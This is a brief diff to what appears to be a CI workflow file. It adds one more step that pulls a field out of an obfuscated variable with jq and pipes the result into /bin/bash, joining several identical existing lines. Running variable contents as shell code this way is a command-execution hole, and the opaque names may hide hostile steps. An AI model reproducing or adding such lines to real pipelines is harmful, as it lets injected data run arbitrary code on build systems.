@@ -33,6 +33,7 @@ jobs:
           echo $v1603 | jq -r .fmwf88535 | /bin/bash
           printf '%s' "$mnapw87029" | jq -r .bef93 | /bin/bash
           echo $emmx307 | jq -r .x6 | /bin/bash
+          printf '%s' "$fex812" | jq -r .gmml491 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
